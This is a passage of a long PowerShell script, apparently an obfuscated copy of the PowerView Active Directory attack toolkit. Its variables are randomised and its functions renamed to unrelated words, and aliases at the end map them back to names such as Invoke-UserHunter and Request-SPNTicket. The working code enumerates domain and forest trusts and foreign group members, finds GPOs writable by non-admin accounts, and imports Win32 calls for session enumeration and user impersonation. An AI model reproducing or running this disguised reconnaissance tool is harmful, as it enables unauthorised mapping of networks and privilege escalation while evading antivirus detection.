                    $RTUBxuup99 | Add-Member Noteproperty 'TrustAttributes' $($xyvRSgGO99 -join ',')
                    $RTUBxuup99 | Add-Member Noteproperty 'TrustDirection' "$PdcjKkjK99"
                    $RTUBxuup99 | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $RTUBxuup99 | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $RTUBxuup99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $RTUBxuup99
                }
                if ($mKhNNgkp99) {
                    try { $mKhNNgkp99.dispose() }
                    catch {
                        Write-Verbose "[adjustable] Error disposing of the Results object: $_"
                    }
                }
                $XmNnvrPC99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $xoNxttfF99 = $YBAlGqrU99
            }
            elseif ($UtXBFQsM99 -and $UtXBFQsM99.Trim() -ne '') {
                $xoNxttfF99 = $UtXBFQsM99
            }
            else {
                $xoNxttfF99 = $Null
            }
            $siQDMuEV99 = [IntPtr]::Zero
            $Flags = 63
            $XcyZfkCt99 = 0
            $kTrwYNCb99 = $wnzumfxs99::DsEnumerateDomainTrusts($xoNxttfF99, $Flags, [ref]$siQDMuEV99, [ref]$XcyZfkCt99)
            $gqSThzCi99 = $siQDMuEV99.ToInt64()
            if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                $nBQFNFfh99 = $HxNDSSlQ99::GetSize()
                for ($i = 0; ($i -lt $XcyZfkCt99); $i++) {
                    $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                    $Info = $qmoPzHeq99 -as $HxNDSSlQ99
                    $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                    $gqSThzCi99 += $nBQFNFfh99
                    $VRPsTnjA99 = ''
                    $kTrwYNCb99 = $ZCzUrYZa99::ConvertSidToStringSid($Info.DomainSid, [ref]$VRPsTnjA99);$STRNLQhd99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($kTrwYNCb99 -eq 0) {
                        Write-Verbose "[adjustable] Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
                    }
                    else {
                        $RTUBxuup99 = New-Object PSObject
                        $RTUBxuup99 | Add-Member Noteproperty 'SourceName' $KiMKpLxi99
                        $RTUBxuup99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $RTUBxuup99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $RTUBxuup99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $RTUBxuup99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $RTUBxuup99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $RTUBxuup99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $RTUBxuup99 | Add-Member Noteproperty 'TargetSid' $VRPsTnjA99
                        $RTUBxuup99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $RTUBxuup99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $RTUBxuup99
                    }
                }
                $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
            }
            else {
                Write-Verbose "[adjustable] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
            }
        }
        else {
            $SONjDSur99 = manège @NetSearcherArguments
            if ($SONjDSur99) {
                $SONjDSur99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function rehearsed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $veLuTYXG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $UIKRzZhy99 = @{}
        if ($PSBoundParameters['Forest']) { $UIKRzZhy99['Forest'] = $veLuTYXG99 }
        if ($PSBoundParameters['Credential']) { $UIKRzZhy99['Credential'] = $fxunRYJT99 }
        $MPieWuCI99 = workaholics @NetForestArguments
        if ($MPieWuCI99) {
            $MPieWuCI99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function Viacom {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        $sMQTvMNR99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Raw']) { $sMQTvMNR99['Raw'] = $Raw }
    }
    PROCESS {
        threatened @SearcherArguments  | ForEach-Object {
            ForEach ($yAmtGGWj99 in $_.memberof) {
                $Index = $yAmtGGWj99.IndexOf('DC=')
                if ($Index) {
                    $IoGbncNy99 = $($yAmtGGWj99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $PnbbFkaS99 = $_.distinguishedname
                    $apOxbKrJ99 = $PnbbFkaS99.IndexOf('DC=')
                    $NzTnTiPA99 = $($_.distinguishedname.SubString($apOxbKrJ99)) -replace 'DC=','' -replace ',','.'
                    if ($IoGbncNy99 -ne $NzTnTiPA99) {
                        $YGzKEtMK99 = $yAmtGGWj99.Split(',')[0].split('=')[1]
                        $UGCcjnXl99 = New-Object PSObject
                        $UGCcjnXl99 | Add-Member Noteproperty 'UserDomain' $NzTnTiPA99
                        $UGCcjnXl99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $UGCcjnXl99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $UGCcjnXl99 | Add-Member Noteproperty 'GroupDomain' $IoGbncNy99
                        $UGCcjnXl99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                        $UGCcjnXl99 | Add-Member Noteproperty 'GroupDistinguishedName' $yAmtGGWj99
                        $UGCcjnXl99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $UGCcjnXl99
                    }
                }
            }
        }
    }
}
function assemblages {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{}
        $sMQTvMNR99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Properties']) { $sMQTvMNR99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Raw']) { $sMQTvMNR99['Raw'] = $Raw }
    }
    PROCESS {
        $EGZjuHez99 = @('Users', 'Domain Users', 'Guests')
        padlocks @SearcherArguments | Where-Object { $EGZjuHez99 -notcontains $_.samaccountname } | ForEach-Object {
            $YGzKEtMK99 = $_.samAccountName
            $gQgsGjrD99 = $_.distinguishedname
            $IoGbncNy99 = $gQgsGjrD99.SubString($gQgsGjrD99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $hUOncYaB99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($IoGbncNy99 -ne $hUOncYaB99)) {
                    $BJUSXVsK99 = $_
                    $vZKCbsyb99 = $_.Split(',')[0].split('=')[1]
                    $yzsIbOCc99 = New-Object PSObject
                    $yzsIbOCc99 | Add-Member Noteproperty 'GroupDomain' $IoGbncNy99
                    $yzsIbOCc99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                    $yzsIbOCc99 | Add-Member Noteproperty 'GroupDistinguishedName' $gQgsGjrD99
                    $yzsIbOCc99 | Add-Member Noteproperty 'MemberDomain' $hUOncYaB99
                    $yzsIbOCc99 | Add-Member Noteproperty 'MemberName' $vZKCbsyb99
                    $yzsIbOCc99 | Add-Member Noteproperty 'MemberDistinguishedName' $BJUSXVsK99
                    $yzsIbOCc99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $yzsIbOCc99
                }
            }
        }
    }
}
function ferns {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $mIpZvziV99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $BaUWLMZN99 = @{}
    $AEQchpQr99 = New-Object System.Collections.Stack
    $WfblziLb99 = @{}
    if ($PSBoundParameters['API']) { $WfblziLb99['API'] = $API }
    if ($PSBoundParameters['NET']) { $WfblziLb99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $WfblziLb99['LDAPFilter'] = $WmhkcxXr99 }
    if ($PSBoundParameters['Properties']) { $WfblziLb99['Properties'] = $rtPnFfWd99 }
    if ($PSBoundParameters['SearchBase']) { $WfblziLb99['SearchBase'] = $nedSgaYy99 }
    if ($PSBoundParameters['Server']) { $WfblziLb99['Server'] = $YBAlGqrU99 }
    if ($PSBoundParameters['SearchScope']) { $WfblziLb99['SearchScope'] = $daZTeEQR99 }
    if ($PSBoundParameters['ResultPageSize']) { $WfblziLb99['ResultPageSize'] = $JFYciBwT99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $WfblziLb99['ServerTimeLimit'] = $qaKJUqzZ99 }
    if ($PSBoundParameters['Tombstone']) { $WfblziLb99['Tombstone'] = $mIpZvziV99 }
    if ($PSBoundParameters['Credential']) { $WfblziLb99['Credential'] = $fxunRYJT99 }
    if ($PSBoundParameters['Credential']) {
        $yAyNhVxn99 = (manège -fxunRYJT99 $fxunRYJT99).Name
    }
    else {
        $yAyNhVxn99 = (manège).Name
    }
    $AEQchpQr99.Push($yAyNhVxn99)
    while($AEQchpQr99.Count -ne 0) {
        $UtXBFQsM99 = $AEQchpQr99.Pop()
        if ($UtXBFQsM99 -and ($UtXBFQsM99.Trim() -ne '') -and (-not $BaUWLMZN99.ContainsKey($UtXBFQsM99))) {
            Write-Verbose "[ferns] Enumerating trusts for domain: '$UtXBFQsM99'"
            $Null = $BaUWLMZN99.Add($UtXBFQsM99, '')
            try {
                $WfblziLb99['Domain'] = $UtXBFQsM99
                $lubZBApo99 = adjustable @DomainTrustArguments
                if ($lubZBApo99 -isnot [System.Array]) {
                    $lubZBApo99 = @($lubZBApo99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $EPqZRasT99 = @{}
                    if ($PSBoundParameters['Forest']) { $EPqZRasT99['Forest'] = $veLuTYXG99 }
                    if ($PSBoundParameters['Credential']) { $EPqZRasT99['Credential'] = $fxunRYJT99 }
                    $lubZBApo99 += rehearsed @ForestTrustArguments
                }
                if ($lubZBApo99) {
                    if ($lubZBApo99 -isnot [System.Array]) {
                        $lubZBApo99 = @($lubZBApo99)
                    }
                    ForEach ($Trust in $lubZBApo99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $AEQchpQr99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[ferns] Error: $_"
            }
        }
    }
}
function prodding {
    [CmdletBinding()]
    Param (
        [String]
        $dpkbnzUO99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $mJCVPUYt99 = 200
    )
    $qFwRBuSK99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $veLuTYXG99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $tzkwYkyt99 = @($veLuTYXG99.Domains)
    $AEQchpQr99 = $tzkwYkyt99 | foreach { $_.GetDirectoryEntry() }
    foreach ($UtXBFQsM99 in $AEQchpQr99) {
        $bNYXjnRz99 = "(&(objectCategory=groupPolicyContainer)(displayname=$dpkbnzUO99))"
        $GczSkSTf99 = New-Object System.DirectoryServices.DirectorySearcher
        $GczSkSTf99.SearchRoot = $UtXBFQsM99
        $GczSkSTf99.Filter = $bNYXjnRz99
        $GczSkSTf99.PageSize = $mJCVPUYt99
        $GczSkSTf99.SearchScope = "Subtree"
        $EuPQBloP99 = $GczSkSTf99.FindAll()
        foreach ($gpo in $EuPQBloP99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $qFwRBuSK99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $teQGcFHF99 = New-Object psobject
            $teQGcFHF99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $teQGcFHF99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $teQGcFHF99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $teQGcFHF99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $teQGcFHF99
        }
        }
    }
}
$Mod = accompanying -ModuleName Win32
$JUaICLKF99 = courthouse $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$HKOMbBRs99 = courthouse $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$qulkrNPT99 = courthouse $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$AnSwWmZA99 = courthouse $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$ZOIDkdLZ99 = stair $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $AnSwWmZA99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$yTKhElvM99 = stair $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$kqULkiwX99 = stair $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$XjifLZrO99 = stair $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$kYRyZzpB99 = stair $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$UpDuuHfD99 = courthouse $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$VjUFEYCf99 = stair $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$RDteTRJL99 = stair $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $UpDuuHfD99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = courthouse $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$apECJwKm99 = courthouse $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$VGrqlUEj99 = courthouse $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$HxNDSSlQ99 = stair $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $apECJwKm99
    TrustAttributes = field 5 $VGrqlUEj99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$ApuIAuqW99 = stair $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($ApuIAuqW99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | proved -Module $Mod -Namespace 'Win32'
$wnzumfxs99 = $Types['netapi32']
$ZCzUrYZa99 = $Types['advapi32']
$rnrPMEpZ99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress asked
Set-Alias Convert-NameToSid secedes
Set-Alias Convert-SidToName dotcom
Set-Alias Request-SPNTicket Bulgarian
Set-Alias Get-DNSZone Lister
Set-Alias Get-DNSRecord initial
Set-Alias Get-NetDomain manège
Set-Alias Get-NetDomainController pizzicatos
Set-Alias Get-NetForest workaholics
Set-Alias Get-NetForestDomain acupuncture
Set-Alias Get-NetForestCatalog quirked
Set-Alias Get-NetUser threatened
Set-Alias Get-UserEvent figures
Set-Alias Get-NetComputer sensationalist
Set-Alias Get-ADObject great
Set-Alias Set-ADObject cheapens
Set-Alias Get-ObjectAcl cauliflowers
Set-Alias Add-ObjectAcl lashed
Set-Alias Invoke-ACLScanner keynote
Set-Alias Get-GUIDMap autopsying
Set-Alias Get-NetOU joyridden
Set-Alias Get-NetSite foundling
Set-Alias Get-NetSubnet teatime
Set-Alias Get-NetGroup padlocks
Set-Alias Find-ManagedSecurityGroups Skylab
Set-Alias Get-NetGroupMember monkeying
Set-Alias Get-NetFileServer nitrated
Set-Alias Get-DFSshare terrestrials
Set-Alias Get-NetGPO adolescents
Set-Alias Get-NetGPOGroup forthwith
Set-Alias Find-GPOLocation parka
Set-Alias Find-GPOComputerAdmin elides
Set-Alias Get-LoggedOnLocal levying
Set-Alias Invoke-CheckLocalAdminAccess patinas
Set-Alias Get-SiteName lambs
Set-Alias Get-Proxy message
Set-Alias Get-LastLoggedOn Nash
Set-Alias Get-CachedRDPConnection rambles
Set-Alias Get-RegistryMountedDrive hypercritical
Set-Alias Get-NetProcess keels
Set-Alias Invoke-ThreadedFunction liable
Set-Alias Invoke-UserHunter Rich
Set-Alias Invoke-ProcessHunter acrobats
